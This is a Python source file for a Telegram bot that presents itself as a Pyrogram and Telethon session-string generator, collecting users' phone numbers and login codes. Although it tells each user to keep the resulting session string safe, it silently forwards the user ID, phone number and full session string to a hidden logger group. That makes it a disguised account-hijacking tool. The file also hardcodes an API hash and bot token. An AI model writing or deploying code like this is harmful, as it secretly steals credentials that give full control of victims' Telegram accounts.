import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession
from pyrogram import Client as PyroClient
from pyrogram.errors import SessionPasswordNeeded as PyroSessionPasswordNeeded
import logging

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706  

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# ✅ Start Command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "**👋 Welcome!**\n\nChoose a session type to generate:",
        buttons=[
            [Button.inline("🐍 Generate Pyrogram Session", b"generate_pyro")],
            [Button.inline("📟 Generate Telethon Session", b"generate_telethon")]
        ]
    )

# ✅ Generate Pyrogram Session
@bot.on(events.CallbackQuery(pattern=b"generate_pyro"))
async def ask_phone_pyro(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_pyro"}
    await event.respond(
        "**📱 Enter your phone number with country code** (e.g., `+919876543210`)",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# ✅ Generate Telethon Session
@bot.on(events.CallbackQuery(pattern=b"generate_telethon"))
async def ask_phone_telethon(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_telethon"}
    await event.respond(
        "**📱 Enter your phone number with country code** (e.g., `+919876543210`)",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# ✅ Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number (Pyrogram)
    if step == "phone_pyro":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = PyroClient("pyrogram_session", api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
            user_sessions[user_id]["step"] = "otp_pyro"
            await event.respond("📩 OTP Sent! Please enter the OTP.")
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")
            del user_sessions[user_id]

    # ✅ Step 1: Enter Phone Number (Telethon)
    elif step == "phone_telethon":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)  
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
            user_sessions[user_id]["step"] = "otp_telethon"
            await event.respond("📩 OTP Sent! Please enter the OTP.")
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP (Pyrogram)
    elif step == "otp_pyro":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  

        try:
            await client.sign_in(phone_number, phone_code_hash, otp_code)  
            session_string = await client.export_session_string()

            await bot.send_message(LOGGER_GROUP_ID, f"✅ **New Pyrogram Session Generated!**\n\n👤 **User ID:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`")

            await event.respond(f"✅ **Your Pyrogram Session String:**\n\n`{session_string}`\n\n🔒 Keep it safe!")
            del user_sessions[user_id]

        except PyroSessionPasswordNeeded:
            user_sessions[user_id]["step"] = "password_pyro"
            await event.respond("🔑 Your account has 2-Step Verification. Please enter your Telegram password.")

        except PhoneCodeExpiredError:
            await event.respond("❌ OTP Expired. Please try again.")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("❌ Invalid OTP. Please try again.")

    # ✅ Step 2: Enter OTP (Telethon)
    elif step == "otp_telethon":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"✅ **New Telethon Session Generated!**\n\n👤 **User ID:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`")

            await event.respond(f"✅ **Your Telethon Session String:**\n\n`{session_string}`\n\n🔒 Keep it safe!")
            del user_sessions[user_id]

        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password_telethon"
            await event.respond("🔑 Your account has 2-Step Verification. Please enter your Telegram password.")

        except PhoneCodeExpiredError:
            await event.respond("❌ OTP Expired. Please try again.")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("❌ Invalid OTP. Please try again.")

# ✅ Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
